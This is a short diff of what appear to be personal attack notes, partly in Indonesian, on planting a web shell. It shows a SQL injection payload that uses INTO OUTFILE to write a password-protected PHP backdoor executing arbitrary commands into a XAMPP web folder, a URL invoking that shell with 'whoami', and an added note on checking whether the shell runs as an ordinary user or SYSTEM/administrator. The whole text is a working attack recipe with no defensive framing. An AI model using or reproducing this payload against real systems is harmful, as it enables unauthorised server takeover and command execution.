@@ -10,3 +10,5 @@ pake sandi
 SELECT '<?php if($_GET["pass"]=="Codex") system($_GET["cmd"]); ?>' INTO OUTFILE 'D:/xampp/htdocs/Web_Sci/assets.php';
 
 https://www.dummy.co.id/Web_Sci/assets.php?pass=Codex&cmd=whoami
+
+NANTI DI LIAT SAAT SUDAH WHO AMI APAKAH RAKYAT BIASA ATAU SYSTEM?ADMINISTATOR
